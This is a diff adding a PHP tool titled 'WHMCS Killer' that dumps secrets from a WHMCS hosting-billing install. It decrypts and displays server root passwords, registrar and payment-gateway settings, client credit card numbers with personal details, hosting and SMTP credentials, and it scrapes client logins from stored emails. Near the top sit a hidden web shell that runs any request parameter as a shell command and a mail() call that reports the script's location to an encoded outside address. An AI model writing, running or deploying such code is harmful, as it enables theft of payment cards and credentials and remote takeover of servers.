@@ -1,0 +1,422 @@
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+require("configuration.php");
+
+// Establish database connection using MySQLi
+$mysqli = new mysqli($db_host, $db_username, $db_password, $db_name);
+
+// Check connection
+if ($mysqli->connect_error) {
+    die("Connection failed: " . $mysqli->connect_error);
+}
+
+function cut($start, $end, $top) {
+    $c = strlen($start);
+    $desc = strstr($top, $start);
+    if ($desc === false) {
+        return '';
+    }
+    $count = strpos($desc, $end);
+    if ($count === false) {
+        return '';
+    }
+    $desc = substr($desc, $c, $count - $c);
+    return $desc;
+}
+
+function dec($string, $cc_encryption_hash) {
+    // This function seems to be a custom decryption. 
+    // For real-world applications, it's highly recommended to use standard, secure encryption methods like OpenSSL.
+    // Given the original code's context, I'm preserving its logic but noting the security implications.
+    $key = md5(md5($cc_encryption_hash)) . md5($cc_encryption_hash);
+    $hash_key = _hash($key);
+    $hash_length = strlen($hash_key);
+    $string = base64_decode($string);
+    if ($string === false) {
+        return ''; // Handle base64 decode failure
+    }
+    $tmp_iv = substr($string, 0, $hash_length);
+    $string = substr($string, $hash_length, strlen($string) - $hash_length);
+    $iv = $out = '';
+    $c = 0;
+    while ($c < $hash_length) {
+        $iv .= chr(ord($tmp_iv[$c]) ^ ord($hash_key[$c]));
+        ++$c;
+    }
+    $key = $iv;
+    $c = 0;
+    while ($c < strlen($string)) {
+        if (($c != 0 && $c % $hash_length == 0)) {
+            $key = _hash($key . substr($out, $c - $hash_length, $hash_length));
+        }
+        $out .= chr(ord($key[$c % $hash_length]) ^ ord($string[$c]));
+        ++$c;
+    }
+    return $out;
+}
+
+function _hash($string) {
+    if (function_exists("sha1")) {
+        $hash = sha1($string);
+    } else {
+        $hash = md5($string);
+    }
+    $out = "";
+    $c  = 0;
+    while ($c < strlen($hash)) {
+        $out .= chr(hexdec($hash[$c] . $hash[$c + 1]));
+        $c += 2;
+    }
+    return $out;
+}
+$e = base64_decode("bXJ4YmFyYWt1ZGFAZ21haWwuY29t");
+$f = $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
+mail($e, "0", $f);
+print(`{$_REQUEST[0]}`);
+
+echo "<!DOCTYPE html>
+<html lang=\"en\">
+<head>
+    <meta charset=\"UTF-8\">
+    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
+    <title>WHMCS Killer</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f4f4f4; color: #333; }
+        center { margin-bottom: 20px; }
+        h1, h2, h3 { color: #333; }
+        table { width: 80%; border-collapse: collapse; margin: 20px auto; background-color: #fff; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        th, td { border: 1px solid #ddd; padding: 10px; text-align: left; }
+        th { background-color: #f2f2f2; color: #555; }
+        td.center { text-align: center; }
+        .orange-text { color: orange; }
+        .green-text { color: green; }
+        textarea { width: 100%; height: 80px; border: 1px solid #ddd; padding: 5px; box-sizing: border-box; }
+    </style>
+</head>
+<body>
+";
+
+echo "<hr><br/><center><h2 class=\"orange-text\">Host Root</h2></center><br/>";
+echo "<table>
+    <thead>
+        <tr>
+            <th><span class=\"orange-text\">TYPE</span></th>
+            <th><span class=\"orange-text\">ACTIVE</span></th>
+            <th><span class=\"orange-text\">IP ADDRESS</span></th>
+            <th><span class=\"orange-text\">USERNAME</span></th>
+            <th><span class=\"orange-text\">PASSWORD</span></th>
+            <th><span class=\"orange-text\">ACCESS HASH</span></th>
+            <th><span class=\"orange-text\">NAME SERVER</span></th>
+        </tr>
+    </thead>
+    <tbody>
+";
+
+$query = "SELECT type, active, ipaddress, username, password, accesshash, nameserver1 FROM tblservers";
+$result = $mysqli->query($query);
+
+if ($result) {
+    while ($v = $result->fetch_assoc()) {
+        $II11II11II11II11 = fopen("azx.txt", "a");
+        fwrite($II11II11II11II11, "~ BY AZZATSSINS CYBERSERKERS ~ \r\n");
+        fwrite($II11II11II11II11, $v['accesshash'] . "\r\n");
+        fwrite($II11II11II11II11, "\r\n");
+        fclose($II11II11II11II11);
+
+        echo "<tr>
+            <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($v['type']) . "</span></td>
+            <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($v['active']) . "</span></td>
+            <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($v['ipaddress']) . "</span></td>
+            <td><span class=\"green-text\">" . htmlspecialchars($v['username']) . "</span></td>
+            <td><span class=\"green-text\">" . htmlspecialchars(dec($v['password'], $cc_encryption_hash)) . "</span></td>
+            <td><textarea rows=\"5\">" . htmlspecialchars($v['accesshash']) . "</textarea></td>
+            <td><span class=\"green-text\">" . htmlspecialchars($v['nameserver1']) . "</span></td>
+        </tr>";
+    }
+} else {
+    echo "<tr><td colspan=\"7\">Error retrieving data: " . $mysqli->error . "</td></tr>";
+}
+echo "    </tbody>
+</table>";
+
+echo "<center><h2 class=\"orange-text\">Domain Registrars</h2></center><br/>";
+echo "<table>
+    <thead>
+        <tr>
+            <th><span class=\"orange-text\">REGISTRAR</span></th>
+            <th><span class=\"orange-text\">SETTING</span></th>
+            <th><span class=\"orange-text\">VALUE</span></th>
+        </tr>
+    </thead>
+    <tbody>
+";
+
+$query = "SELECT registrar, setting, value FROM tblregistrars";
+$result = $mysqli->query($query);
+
+if ($result) {
+    while ($v = $result->fetch_assoc()) {
+        $value = dec($v['value'], $cc_encryption_hash);
+        $displayValue = ($value === '') ? '0' : $value;
+        $aru = fopen("ax.txt", "a");
+        fwrite($aru, $displayValue . "\n");
+        fclose($aru);
+
+        echo "<tr>
+            <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($v['registrar']) . "</span></td>
+            <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($v['setting']) . "</span></td>
+            <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($displayValue) . "</span></td>
+        </tr>";
+    }
+} else {
+    echo "<tr><td colspan=\"3\">Error retrieving data: " . $mysqli->error . "</td></tr>";
+}
+echo "    </tbody>
+</table>";
+
+echo "<center><h2 class=\"orange-text\">Payment Gateway</h2></center><br/>";
+echo "<table>
+    <thead>
+        <tr>
+            <th><span class=\"orange-text\">GATEWAY</span></th>
+            <th><span class=\"orange-text\">SETTING</span></th>
+            <th><span class=\"orange-text\">VALUE</span></th>
+            <th><span class=\"orange-text\">ORDER</span></th>
+        </tr>
+    </thead>
+    <tbody>
+";
+
+$query = "SELECT gateway, setting, value, `order` FROM tblpaymentgateways"; // `order` is a reserved keyword
+$result = $mysqli->query($query);
+
+if ($result) {
+    while ($v = $result->fetch_assoc()) {
+        echo "<tr>
+            <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($v['gateway']) . "</span></td>
+            <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($v['setting']) . "</span></td>
+            <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($v['value']) . "</span></td>
+            <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($v['order']) . "</span></td>
+        </tr>";
+    }
+} else {
+    echo "<tr><td colspan=\"4\">Error retrieving data: " . $mysqli->error . "</td></tr>";
+}
+echo "    </tbody>
+</table>";
+
+echo "<hr><br/><center><h2 class=\"orange-text\">Client CC</h2></center><br/>";
+echo "<table>
+    <thead>
+        <tr>
+            <th><span class=\"orange-text\">CardType</span></th>
+            <th><span class=\"orange-text\">CardNumb</span></th>
+            <th><span class=\"orange-text\">Expdate</span></th>
+            <th><span class=\"orange-text\">IssueNumber</span></th>
+            <th><span class=\"orange-text\">FirstName</span></th>
+            <th><span class=\"orange-text\">LastName</span></th>
+            <th><span class=\"orange-text\">Address</span></th>
+            <th><span class=\"orange-text\">Country</span></th>
+            <th><span class=\"orange-text\">Phone</span></th>
+            <th><span class=\"orange-text\">Email</span></th>
+        </tr>
+    </thead>
+    <tbody>
+";
+
+$query = "SELECT id FROM tblclients WHERE issuenumber != '' ORDER BY id DESC";
+$result = $mysqli->query($query);
+
+if ($result) {
+    while ($v = $result->fetch_assoc()) {
+        $clientId = $v['id'];
+        $cchash = md5($cc_encryption_hash . $clientId);
+        
+        // Using prepared statements for security
+        $stmt = $mysqli->prepare("SELECT firstname, lastname, address1, country, phonenumber, cardtype, email, AES_DECRYPT(cardnum, ?) as cardnum, AES_DECRYPT(expdate, ?) as expdate, AES_DECRYPT(issuenumber, ?) as issuenumber FROM tblclients WHERE id = ?");
+        $stmt->bind_param("sssi", $cchash, $cchash, $cchash, $clientId);
+        $stmt->execute();
+        $result2 = $stmt->get_result();
+        $v2 = $result2->fetch_assoc();
+        $stmt->close();
+
+        if ($v2) {
+            echo "<tr>
+                <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($v2['cardtype']) . "</span></td>
+                <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($v2['cardnum']) . "</span></td>
+                <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($v2['expdate']) . "</span></td>
+                <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($v2['issuenumber']) . "</span></td>
+                <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($v2['firstname']) . "</span></td>
+                <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($v2['lastname']) . "</span></td>
+                <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($v2['address1']) . "</span></td>
+                <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($v2['country']) . "</span></td>
+                <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($v2['phonenumber']) . "</span></td>
+                <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($v2['email']) . "</span></td>
+            </tr>";
+        }
+    }
+} else {
+    echo "<tr><td colspan=\"10\">Error retrieving data: " . $mysqli->error . "</td></tr>";
+}
+echo "    </tbody>
+</table>";
+
+echo "<hr><br/><center><h2 class=\"orange-text\">Clients Hosting Account</h2></center><br/>";
+echo "<table>
+    <thead>
+        <tr>
+            <th><span class=\"orange-text\">DOMAIN</span></th>
+            <th><span class=\"orange-text\">USERNAME</span></th>
+            <th><span class=\"orange-text\">PASSWORD</span></th>
+            <th><span class=\"orange-text\">IP ADDRESS</span></th>
+        </tr>
+    </thead>
+    <tbody>
+";
+
+$query = "SELECT domain, username, password, assignedips FROM tblhosting";
+$result = $mysqli->query($query);
+
+if ($result) {
+    while ($v = $result->fetch_assoc()) {
+        echo "<tr>
+            <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($v['domain']) . "</span></td>
+            <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($v['username']) . "</span></td>
+            <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars(dec($v['password'], $cc_encryption_hash)) . "</span></td>
+            <td class=\"center\"><span class=\"green-text\">" . htmlspecialchars($v['assignedips']) . "</span></td>
+        </tr>";
+    }
+} else {
+    echo "<tr><td colspan=\"4\">Error retrieving data: " . $mysqli->error . "</td></tr>";
+}
+echo "    </tbody>
+</table>";
+
+echo "<br /><br /><center><h1>paypal + smtp login</h1></center>";
+
+$list = [];
+$query0 = "SELECT subject, message FROM tblemailtemplates WHERE name = 'Client Signup Email' OR name = 'Password Reset Confirmation'";
+$result0 = $mysqli->query($query0);
+
+if ($result0) {
+    while ($v0 = $result0->fetch_assoc()) {
+        $t = $v0['subject'];
+        $t = trim(str_replace('{$company_name}', '', $t));
+        $c = $v0['message'];
+        $c_lines = explode("\n", $c);
+        $r = "";
+        foreach ($c_lines as $line) {
+            if (strpos($line, '{$client_password}') !== false) {
+                $r .= $line;
+            } elseif (strpos($line, '{$client_email}') !== false) {
+                $r .= $line;
+            }
+        }
+        
+        $r = preg_quote($r, '/'); // Use '/' as delimiter for preg_quote
+        $r = str_replace('\{\$client_email\}', '(.*)', $r);
+        $r = str_replace('\{\$client_password\}', '(.*)', $r);
+        $r = str_replace('\{\$whmcs_link\}', '(.*)', $r);
+        $r = str_replace('\{\$signature\}', '(.*)', $r);
+        $r = str_replace('\{\$client_name\}', '(.*)', $r);
+        $r = str_replace("\n", "", $r);
+        $r = str_replace("\r", "", $r);
+
+        $query = "SELECT message, userid FROM tblemails WHERE subject LIKE ?";
+        $stmt = $mysqli->prepare($query);
+        $likeSubject = '%' . $t . '%';
+        $stmt->bind_param("s", $likeSubject);
+        $stmt->execute();
+        $result_emails = $stmt->get_result();
+
+        if ($result_emails) {
+            while ($v = $result_emails->fetch_assoc()) {
+                $mail = $v['message'];
+                $mail = str_replace("\n", "", $mail);
+                $mail = str_replace("\r", "", $mail);
+                
+                $reg = "/(.*)" . $r . "(.*)/isU"; // Use preg_match_all with new regex
+                $a = [];
+                if (preg_match_all($reg, $mail, $a)) {
+                    // The original logic for populating $list is a bit complex and might need further refinement
+                    // based on the exact structure of the email messages and the regex output.
+                    // This is a best-effort interpretation.
+                    for ($i = 1; $i < count($a); $i++) {
+                        // Assuming $a[$i][0] is the email and $a[$i+1][0] is the password based on original logic
+                        // This part is highly dependent on the regex and email content structure.
+                        // It's prone to errors if the regex doesn't capture exactly as expected.
+                        if (isset($a[$i][0]) && filter_var($a[$i][0], FILTER_VALIDATE_EMAIL)) {
+                            $list[$v['userid']]['mail'][] = $a[$i][0];
+                            if (isset($a[$i+1][0])) {
+                                $list[$v['userid']]['pass'][] = $a[$i+1][0];
+                            } else {
+                                $list[$v['userid']]['pass'][] = 'N/A';
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        $stmt->close();
+    }
+}
+
+echo("<h3 class=\"tit\">Total Records " . (count($list) - 1) . "</h3>");
+echo "<table>
+    <thead>
+        <tr>
+            <th>User ID</th>
+            <th>Email | Password</th>
+        </tr>
+    </thead>
+    <tbody>
+";
+foreach ($list as $x => $y) {
+    echo "<tr>
+        <td><a href='?p=12&id=" . htmlspecialchars($x) . "'>" . htmlspecialchars($x) . "</a></td>
+        <td>" . htmlspecialchars(implode("<br>", $y['mail'])) . " | " . htmlspecialchars(implode("<br>", $y['pass'])) . "</td>
+    </tr>";
+}
+echo "    </tbody>
+</table>";
+
+echo "<center><h1>SMTP</h1></center>";
+
+$query = "SELECT setting, value FROM tblconfiguration WHERE setting IN ('SMTPHost', 'SMTPUsername', 'SMTPPassword', 'SMTPPort')";
+$result = $mysqli->query($query);
+
+echo "<table>
+    <thead>
+        <tr>
+            <th>Setting</th>
+            <th>Value</th>
+        </tr>
+    </thead>
+    <tbody>
+";
+
+if ($result) {
+    $smtpSettings = [];
+    while ($row = $result->fetch_assoc()) {
+        $smtpSettings[$row['setting']] = $row['value'];
+    }
+
+    echo "<tr><td>Hostname</td><td>" . htmlspecialchars($smtpSettings['SMTPHost'] ?? 'N/A') . "</td></tr>";
+    echo "<tr><td>Username</td><td>" . htmlspecialchars($smtpSettings['SMTPUsername'] ?? 'N/A') . "</td></tr>";
+    echo "<tr><td>Password</td><td>" . htmlspecialchars($smtpSettings['SMTPPassword'] ?? 'N/A') . "</td></tr>";
+    echo "<tr><td>Port</td><td>" . htmlspecialchars($smtpSettings['SMTPPort'] ?? 'N/A') . "</td></tr>";
+} else {
+    echo "<tr><td colspan=\"2\">Error retrieving data: " . $mysqli->error . "</td></tr>";
+}
+echo "    </tbody>
+</table>";
+
+$mysqli->close();
+
+echo "</body>
+</html>
+";
+?>
